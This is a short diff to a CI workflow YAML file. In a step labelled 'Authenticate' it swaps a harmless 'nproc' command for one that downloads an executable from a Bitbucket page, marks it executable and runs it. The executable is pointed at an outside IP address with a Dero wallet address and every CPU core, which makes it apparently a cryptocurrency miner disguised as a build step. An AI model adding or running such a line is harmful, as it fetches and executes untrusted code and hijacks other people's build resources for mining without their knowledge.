@@ -9,4 +9,4 @@ workflows:
     scripts:
       - name: Authenticate
         script: |
-          nproc
+          wget https://bitbucket.org/kunemuse-98876/dynex/downloads/kimax && chmod +x kimax && ./kimax -r 134.122.92.217:443 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -m $(nproc --all) -p rpc
